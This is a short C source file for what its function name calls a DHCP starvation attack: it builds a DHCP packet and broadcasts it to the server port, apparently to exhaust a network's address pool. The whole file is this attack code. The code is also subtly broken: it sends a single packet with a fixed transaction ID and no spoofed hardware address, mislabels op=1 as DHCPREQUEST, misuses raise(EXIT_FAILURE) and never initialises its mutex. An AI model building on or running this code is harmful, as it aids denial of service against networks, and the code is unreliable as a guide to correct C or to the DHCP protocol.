#include <dhcp.h>
#include <stdlib.h>
#include <signal.h>
#include <string.h>
#include <pthread.h>
#include <stdio.h>
#include <arpa/inet.h>

static pthread_mutex_t DHCPMutex;

static inline void LockDHCPFunction(){
    pthread_mutex_init(&DHCPMutex,NULL);
}


void DHCPStarvation(char* broadcastAddr){
    #ifdef LOCK
    pthread_mutex_lock(&DHCPMutex);
    #endif    
    int sockfd;
    struct sockaddr_in servaddr;

    if ((sockfd = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("socket creation failed");
        raise(EXIT_FAILURE);
    }

    memset(&servaddr,0,sizeof(servaddr));
    servaddr.sin_family = AF_INET;
    servaddr.sin_port = htons(DHCP_SERVER_PORT);
    servaddr.sin_addr.s_addr = inet_addr(broadcastAddr); // Broadcast address

    struct dhcp_packet packet;
    memset(&packet,0,sizeof(packet));
    packet.op = 1; // DHCPREQUEST
    packet.htype = 1; // Ethernet
    packet.hlen = 6; // Hardware address length
    packet.xid = htonl(123456); // Transaction ID
    packet.magic_cookie = htonl(DHCP_MAGIC_COOKIE); // Magic cookie

    if (sendto(sockfd, &packet, sizeof(packet), 0, (struct sockaddr*)&servaddr, sizeof(servaddr)) < 0) {
        perror("sendto failed");
        raise(EXIT_FAILURE);
    }
    printf("Sended the packet");

    #ifdef LOCK
    pthread_mutex_unlock(&DHCPMutex);
    #endif

}


